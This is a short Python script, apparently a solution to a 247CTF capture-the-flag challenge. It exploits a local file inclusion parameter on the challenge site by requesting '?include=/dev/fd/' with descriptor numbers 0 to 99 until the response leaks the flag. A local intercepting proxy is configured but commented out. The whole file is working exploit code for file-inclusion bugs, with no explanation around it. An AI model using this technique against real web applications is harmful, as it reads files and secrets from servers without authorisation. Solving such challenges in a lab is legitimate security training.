#!/usr/bin/env python3

import requests

host = "https://91a48225da1947f2.247ctf.com/"

include = "?include=/dev/fd/"
proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

for _ in range(100) :
    print(f"File descriptor number {_}")
    r = requests.get(host + include + f'{_}')#, proxies = proxies, verify=False)
    if "247" in r.text :
        flag_start = r.text.index("247")
        print(r.text[flag_start:flag_start+41])
        break
